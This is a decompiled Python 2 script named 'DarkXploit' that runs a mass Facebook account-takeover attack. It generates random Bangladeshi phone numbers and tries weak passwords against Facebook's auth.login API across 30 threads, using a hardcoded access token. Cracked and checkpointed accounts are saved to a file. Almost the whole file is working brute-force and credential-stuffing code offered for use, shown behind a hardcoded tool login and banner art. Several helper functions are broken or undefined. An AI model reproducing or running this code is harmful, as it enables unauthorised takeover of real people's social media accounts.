#Decompiled By 
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: DarkXploit
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(20000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('No Module Named Requests! type:pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('No Module Named Mechanize! type:pip2 install mechanize')
    time.sleep(1)
    os.system('Then type: python2 bdcloner.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
    print 'Thanks.'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;93mPlease Wait \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
print '\n\n     \x1b[1;92m><<< ><<<<<<    ><<<<         ><<<<       ><<      \n     \x1b[1;92m     ><<      ><<    ><<    ><<    ><<    ><<      \n     \x1b[1;93m     ><<    ><<        ><< ><<        ><< ><<      \n     \x1b[1;93m     ><<    ><<        ><< ><<        ><< ><<      \n     \x1b[1;96m     ><<    ><<        ><< ><<        ><< ><<      \n     \x1b[1;96m     ><<      ><<     ><<   ><<     ><<   ><<      \n     \x1b[1;96m     ><<        ><<<<         ><<<<       ><<<<<<<<\n\n\x1b[1;91m><<          ><<<<        ><<<<        ><<  ><<<     ><<\n\x1b[1;91m><<        ><<    ><<   ><    ><<      ><<  >< ><<   ><<\n\x1b[1;92m><<      ><<        ><<><<             ><<  ><< ><<  ><<\n\x1b[1;92m><<      ><<        ><<><<             ><<  ><<  ><< ><<\n\x1b[1;95m><<      ><<        ><<><<   ><<<<     ><<  ><<   >< ><<\n\x1b[1;95m><<        ><<     ><<  ><<    ><      ><<  ><<    >< <<\n\x1b[1;96m><<<<<<<<    ><<<<       ><<<<<        ><<  ><<      ><<\n\n \x1b[1;93m|\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;93m=>=>|\n \x1b[1;93m|                                                          |\n \x1b[1;93m| \x1b[1;96mAUTHOR : HUNTERBOY ALAMIN\x1b[1;93m                                |\n \x1b[1;93m|                                                          |\n \x1b[1;93m| \x1b[1;96mFACEBOOK : MD ALAMIN KHAN\x1b[1;93m                                |\n \x1b[1;93m|                                                          |\n \x1b[1;93m| \x1b[1;96mCONTACT : https://www.facebook.com/alaminkhan.60    \x1b[1;93m     |\n \x1b[1;93m|                                                          |\n \x1b[1;93m|\n \x1b[1;93m|\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;93m|    \n\n'
logo1 = '\n\n               \x1b[1;92m########  ########                       \n              \x1b[1;92m ##     ## ##     ##                      \n              \x1b[1;95m ##     ## ##     ##                      \n              \x1b[1;95m ########  ##     ##                      \n              \x1b[1;91m ##     ## ##     ##                      \n              \x1b[1;91m ##     ## ##     ##                      \n              \x1b[1;91m ########  ########                       \n\n\x1b[1;93m ######  ##        #######  ##    ## ######## ########  \n\x1b[1;93m##    ## ##       ##     ## ###   ## ##       ##     ## \n\x1b[1;94m##       ##       ##     ## ####  ## ##       ##     ## \n\x1b[1;94m##       ##       ##     ## ## ## ## ######   ########  \n\x1b[1;96m##       ##       ##     ## ##  #### ##       ##   ##   \n\x1b[1;96m##    ## ##       ##     ## ##   ### ##       ##    ##  \n\x1b[1;96m ######  ########  #######  ##    ## ######## ##     ## \n\n \x1b[1;93m|\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;93m=>=>|\n \x1b[1;93m|                                                          |\n \x1b[1;93m| \x1b[1;96mAUTHOR : HUNTERBOY ALAMIN\x1b[1;93m                                |\n \x1b[1;93m|                                                          |\n \x1b[1;93m| \x1b[1;96mFACEBOOK : MD ALAMIN KHAN\x1b[1;93m                                |\n \x1b[1;93m|                                                          |\n \x1b[1;93m| \x1b[1;96mCONTACT : https://www.facebook.com/alaminkhan.60    \x1b[1;93m     |\n \x1b[1;93m|                                                          |\n \x1b[1;93m|\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;93m|  \n\n'
logo = '\n\n        \x1b[1;92m___  ____ _  _ ____ _    ____ ___  ____ ____ _  _ \n        \x1b[1;91m|__] |__| |\\ | | __ |    |__| |  \\ |___ [__  |__| \n        \x1b[1;92m|__] |  | | \\| |__] |___ |  | |__/ |___ ___] |  | \n\n\x1b[1;96m _______  _______  _______  _______  _        _______  _______                            \n\x1b[1;96m(  ____ \\(  ____ )(  ___  )(  ____ \\| \\    /\\(  ____ \\(  ____ )                           \n\x1b[1;91m| (    \\/| (    )|| (   ) || (    \\/|  \\  / /| (    \\/| (    )|                           \n\x1b[1;91m| |      | (____)|| (___) || |      |  (_/ / | (__    | (____)|                           \n\x1b[1;93m| |      |     __)|  ___  || |      |   _ (  |  __)   |     __)                           \n\x1b[1;93m| |      | (\\ (   | (   ) || |      |  ( \\ \\ | (      | (\\ (                              \n\x1b[1;94m| (____/\\| ) \\ \\__| )   ( || (____/\\|  /  \\ \\| (____/\\| ) \\ \\__                           \n\x1b[1;94m(_______/|/   \\__/|/     \\|(_______/|_/    \\/(_______/|/   \\__/\n\n\x1b[1;93m|\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;93m=>=>|\n \x1b[1;93m|                                                          |\n \x1b[1;93m| \x1b[1;96mAUTHOR : HUNTERBOY ALAMIN\x1b[1;93m                                |\n \x1b[1;93m|                                                          |\n \x1b[1;93m| \x1b[1;96mFACEBOOK : MD ALAMIN KHAN\x1b[1;93m                                |\n \x1b[1;93m|                                                          |\n \x1b[1;93m| \x1b[1;96mCONTACT : https://www.facebook.com/alaminkhan.60    \x1b[1;93m     |\n \x1b[1;93m|                                                          |\n \x1b[1;93m|\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;92m=>\x1b[1;91m=>\x1b[1;93m|  \n\n'
CorrectUsername = 'HUNTERBOY'
CorrectPassword = 'alaminkhan'
loop = 'true'
while loop == 'true':
    username = raw_input('\x1b[1;93m\x1b[1;92mTool Username \x1b[1;93m=>: \x1b[1;93m')
    if username == CorrectUsername:
        password = raw_input('\x1b[1;91m \x1b[1;92mTool Password \x1b[1;93m=>: \x1b[1;97m')
        if password == CorrectPassword:
            print 'Logged in successfully as HUNTERBOY ALAMIN'
            time.sleep(2)
            loop = 'false'
        else:
            print '\x1b[1;94mWrong Password'
            os.system('xdg-open https://www.facebook.com/alaminkhan.60')
    else:
        print '\x1b[1;94mWrong Username'
        os.system('xdg-open https://www.facebook.com/alaminkhan.60')

def lisensi():
    os.system('clear')
    login()


def login():
    print logo
    os.system('clear')
    print logo
    print '\x1b[1;93m[\x1b[1;92m\x1b[1;93m] \x1b[1;93m[1] First Like My Facebook Page'
    print '\x1b[1;93m[\x1b[1;92m\x1b[1;93m] \x1b[1;93m[0] Exit'
    pilih_login()


def pilih_login():
    peak = raw_input('\n\x1b[1;91m[\x1b[1;91m\x1b[1;91m] \x1b[1;95m[\xe2\x97\x88] \x1b[1;95mChoose an Option:\x1b[1;98m')
    if peak == '':
        print '\x1b[1;91mFill In Correctly'
        pilih_login()
    elif peak == '1':
        os.system('xdg-open https://www.facebook.com/alaminkhan.60')
        login1()
    elif peak == '0':
        keluar()
    else:
        print '\x1b[1;91m[!] Invalid Option'
        keluar()


def login1():
    os.system('clear')
    print logo
    print '\x1b[1;93m[\x1b[1;93m] \x1b[1;93m[1]\x1b[1;92m Fast Clone Bangladeshi Facebook Accounts.'
    print '\x1b[1;93m[\x1b[1;92m\x1b[1;93m] \x1b[1;93m[2] Contact Me On Facebook'
    print '\x1b[1;93m[\x1b[1;92m\x1b[1;93m] \x1b[1;93m[0]\x1b[1;91m Exit.'
    pilih_login1()


def pilih_login1():
    peak = raw_input('\n\x1b[1;91m[\x1b[1;91m] \x1b[1;95m[\xe2\x97\x88] \x1b[1;95mChoose an Option:\x1b[1;98m')
    if peak == '':
        print '\x1b[1;91mFill In Correctly'
        pilih_login1()
    elif peak == '1':
        Hunter()
    elif peak == '2':
        os.system('xdg-open https://www.facebook.com/alaminkhan.60')
        login1()
    elif peak == '0':
        keluar()
    else:
        print '\x1b[1;91m[!] Invalid Option'
        pilih_login1()


def Hunter():
    os.system('clear')
    print logo1
    print '\x1b[1;93m[\x1b[1;93m] \x1b[1;93m[1]\x1b[1;93m Start The Process'
    time.sleep(0.05)
    print '\x1b[1;93m[\x1b[1;93m] \x1b[1;93m[0]\x1b[1;91m Go Back '
    time.sleep(0.05)
    pilih_Hunter()


def pilih_Hunter():
    peak = raw_input('\n\x1b[\x1b[1;91m] \x1b[1;95m[\xe2\x97\x88] \x1b[1;92mChoose an Option:\x1b[1;98m')
    if peak == '':
        print '[!] Fill In Correctly'
        pilih_login1()
    elif peak == '1':
        Trypass()
    elif peak == '0':
        login1()


def Trypass():
    os.system('clear')
    print logo1
    print '\x1b[1;93m[\x1b[1;93m] \x1b[1;93m[1]\x1b[1;96m Try Automatic Passwords'
    print '\x1b[1;93m[\x1b[1;93m] \x1b[1;93m[2]\x1b[1;94m Try Your Own Passwords'
    print '\x1b[1;93m[\x1b[\x1b[1;93m] \x1b[1;93m[0]\x1b[1;91m Go Back To The Previous Menu'
    pilih_Trypass()


def pilih_Trypass():
    peak = raw_input('\n\x1b[1;91m[] \x1b[1;95m[\xe2\x97\x88] \x1b[1;92mChoose an Option:\x1b[1;98m')
    if peak == '':
        print '[!] Fill In Correctly'
        pilih_Trypass()
    elif peak == '1':
        automatic()
    elif peak == '2':
        own()
    elif peak == '0':
        Hunter()
    else:
        print '[!] Fill In Correctly'
        passmenu()


def automatic():
    global cpb
    global oks
    os.system('clear')
    print logo1
    print '\x1b[1;93mAvailable Area Codes:'
    print 50 * '\x1b[1;94m_\x1b[1;96m-'
    print '\n\n      \x1b[1;92m|================================================|\n\n'
    print '  popular country codes ::'
    print '              \x1b[1;94m130 , 160 , 163 , 164 ,171 , 172\n'
    print '                \x1b[1;96m177 , 181 , 182 , 187 , 188 , 189\n'
    print '                \x1b[1;91m191 , 192 , 193 , 194 , 195 , 196\n\n'
    print '      \x1b[1;92m|===============================================|\n\n'
    print '   \nSome other country codes that you may also use::\n'
    print '  \x1b[1;93m|>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>|\n\n'
    print '    \x1b[1;96m151 , 152 , 153 , 154 , 155 , 156 , 157 \n'
    print '    \x1b[1;91m158 , 159 , 161 , 162 , 163 , 164 , 165 \n'
    print '    \x1b[1;93m166 , 167 , 168 , 169 ,171 , 172 , 173 \n'
    print '    \x1b[1;92m174 , 175 , 176 , 178 , 179 , 181 , 182 \n'
    print '    \x1b[1;94m183 , 184 , 185, 186 , 191, 192,  197, 198, 199\n\n'
    print '  \x1b[1;93m|>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>|\n\n'
    print 50 * '\x1b[1;94m_-'
    try:
        c = raw_input('\n\x1b[1;93m[\x1b[1;93m] \x1b[1;93m[\xe2\x97\x88] \x1b[1;93mChoose Area Code:\x1b[1;98m')
        k = '+880'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ Back ]')
        Trypass()

    print 50 * '\x1b[1;95m\xe2\x97\x88'
    print '\x1b[1;37;40m\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88 Cloning Process Has Been Started \xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88'
    print '\x1b[1;37;40m\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88 To Stop The Process Press CTRl+Z \xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88'
    xxx = str(len(id))
    jalan('[\xe2\x9c\x85] \x1b[1;97mTotal Numbers: ' + xxx)
    jalan('\x1b[1;97m[\xe2\x9c\x85] \x1b[1;97mTrying Passwords Wait...')
    print 50 * '\x1b[1;95m\xe2\x97\x88'
    print '\x1b[1;92m\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88 Developed By HAUNTERBOY ALAMIN \xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88 '

    def main(arg):
        user = arg
        try:
            os.mkdir('cloned')
        except OSError:
            pass

        try:
            pass1 = 'Bangladesh'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[SUCCESSFUL]    ' + k + c + user + '  \x1b[1;92m| |  \x1b[1;92m' + pass1 + ' \x1b[1;92m[LOG IN NOW] '
                okb = open('cloned/idz.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[CHECKPOINT] \x1b[1;93m' + k + c + user + '  \x1b[1;93m| | ' + pass1 + ' \x1b[1;96m[LOG IN AFTER 60 HOURS]'
                cps = open('cloned/idz.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = user
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[SUCCESSFUL]    ' + k + c + user + '  \x1b[1;92m| |  ' + pass2 + ' \x1b[1;92m[LOG IN NOW]'
                    okb = open('cloned/idz.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;93m[CHECKPOINT] \x1b[1;91m' + k + c + user + '  \x1b[1;93m| | \x1b[1;91m ' + pass2 + ' \x1b[1;96m[LOG IN AFTER 60 HOURS]'
                    cps = open('cloned/idz.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\x1b[1;95m'
    print '\x1b[1;92m\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88 Developed By HAUNTERBOY ALAMIN \xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88 '
    print '[\xe2\x9c\x85] Process Has Been Completed ...'
    print '[\xe2\x9c\x85] Total checkpoint/Successful : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x85] Cloned Accounts Has Been Saved : cloned/idz.txt'
    jalan('\x1b[1;96mInstruction:')
    jalan('\x1b[1;97mCHECKPOINT Accounts Will Open Between 3-7 Days')
    jalan('\x1b[1;96mGOOD BYE')
    raw_input('\n\x1b[1;94m[\x1b[1;91mBack\x1b[1;95m]')
    login()


def own():
    os.system('clear')
    print logo1
    print '\x1b[1;93mAvailable Area Codes:'
    print 50 * '\x1b[1;94m_\x1b[1;96m-'
    print '   \n\npopular country codes ::'
    print '\n       \x1b[1;92m|==============================================|\n\n'
    print '             \x1b[1;94m130 , 160 , 163 , 164 , 171 , 172\n'
    print '             \x1b[1;96m177 , 181 , 182 , 187 , 188 , 189\n'
    print '             \x1b[1;91m191 , 192 , 193 , 194 , 195 , 196\n'
    print '        \x1b[1;92m|==============================================|\n\n'
    print '     Some other country codes that you may also use::'
    print '   \x1b[1;93m|>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>|\n\n'
    print '      \x1b[1;96m151 , 152 , 153 , 154 , 155 , 156 , 157 \n'
    print '       \x1b[1;91m158 , 159 , 161 , 162 , 163 , 164 , 165 \n'
    print '       \x1b[1;93m166 , 167 , 168 , 169 ,171 , 172 , 173 \n'
    print '       \x1b[1;92m174 , 175 , 176 , 178 , 179 , 181 , 182 \n'
    print '       \x1b[1;94m183 , 184 , 185, 186 , 191, 192,  197, 198, 199\n\n'
    print '  \x1b[1;93m|>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>|\n\n'
    print 50 * '\x1b[1;94m_\x1b[1;96m-'
    try:
        c = raw_input('\n\x1b[1;93m[\x1b[1;93m] \x1b[1;93m[\xe2\x97\x88] \x1b[1;93mChoose Area Code:\x1b[1;98m')
        pass1 = raw_input('\x1b[1;93m[\x1b[\x1b[1;93m] \x1b[1;93m[\xe2\x97\x88] \x1b[1;92mEnter Your Password: \x1b[1;97m')
        k = '+880'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ Back ]')
        passmenu()

    print 50 * '\x1b[1;95m\xe2\x97\x88'
    print '\x1b[1;37;40m\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88 Cloning Process Has Been Started \xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88'
    print '\x1b[1;37;40m\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88 To Stop The Process Press CTRl+Z \xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88'
    xxx = str(len(id))
    jalan('\x1b[1;97m[\xe2\x9c\x85] \x1b[1;97mTotal Numbers: ' + xxx)
    jalan('\x1b[1;97m[\xe2\x9c\x85] \x1b[1;97mTrying Your Password Wait...')
    print 50 * '\x1b[1;95m\xe2\x97\x88'
    print '\x1b[1;92m\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88 Developed By HAUNTERBOY ALAMIN \xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88 '

    def main(arg):
        user = arg
        try:
            os.mkdir('cloned')
        except OSError:
            pass

        try:
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[SUCCESSFUL ]    ' + k + c + user + ' \x1b[1;93m| |  ' + pass1 + ' \x1b[1;92m[LOG IN NOW]'
                okb = open('cloned/idz.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[CHECKPOINT] \x1b[1;93m' + k + c + user + ' \x1b[1;93m| |  ' + pass1 + ' \x1b[1;96m[LOG IN AFTER 60 HOURS]'
                cps = open('cloned/idz.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\x1b[1;95m'
    print '\x1b[1;92m\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88 Developed By HAUNTERBOY ALAMIN \xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88 '
    print '[\xe2\x9c\x85] Process Has Been Completed ...'
    print '[\xe2\x9c\x85] Successful\\Checkpoint : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x85] Cloned Accounts Has Been Saved : cloned/idz.txt'
    jalan('\x1b[1;96mInstruction:')
    jalan('\x1b[1;97mCHECKPOINT Accounts Will Open Between 3-7 Days')
    jalan('\x1b[1;96mGOOD BYE')
    raw_input('\n\x1b[1;94m[\x1b[1;91mBack\x1b[1;95m]')
    own()


if __name__ == '__main__':
    login()
